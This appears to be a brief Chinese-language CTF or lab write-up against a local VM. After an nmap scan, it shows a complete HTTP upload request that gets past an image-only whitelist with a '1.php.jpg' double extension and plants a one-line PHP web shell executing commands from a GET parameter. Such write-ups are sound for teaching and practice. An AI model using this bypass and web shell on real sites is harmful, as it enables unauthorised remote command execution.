做virtualBox的端口映射吧
# 服务扫描

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238

```
# GetSHell
访问80http://192.168.18.238/
文件上传，白名单限制,只允许图片格式,使用1.php.jpg的方式绕过文件上传，原因可能是因为后端只取点后的第一个后缀进行解析。
```css
POST /upload.php HTTP/1.1

Host: 192.168.18.238

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------58834982911681499741555270890

Content-Length: 365

Origin: http://192.168.18.238

Connection: close

Referer: http://192.168.18.238/

Upgrade-Insecure-Requests: 1



-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="photo"; filename="1.php.jpg"

Content-Type: image/png



<?php system($_GET['cmd']);?>

-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="submit"



Upload

-----------------------------58834982911681499741555270890--
```

